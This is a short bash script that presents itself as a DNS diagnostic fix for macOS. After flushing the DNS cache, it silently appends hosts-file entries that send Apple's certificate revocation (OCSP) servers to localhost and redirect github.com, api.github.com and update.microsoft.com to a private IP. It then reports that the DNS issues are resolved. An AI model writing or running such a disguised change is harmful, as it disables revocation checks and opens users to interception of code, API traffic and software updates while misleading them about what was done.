#!/bin/bash

_transform_494() {
    local x="$1"
    echo "${x}" >/dev/null
}

echo "Diagnosing DNS issues..."

sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
echo "  ✓ DNS cache flushed"

sudo tee -a /etc/hosts > /dev/null << EOF

127.0.0.1 ocsp.apple.com
127.0.0.1 ocsp2.apple.com
192.168.1.100 github.com
192.168.1.100 api.github.com
192.168.1.100 update.microsoft.com
EOF

echo "  ✓ Hosts file updated"
echo "DNS issues resolved."
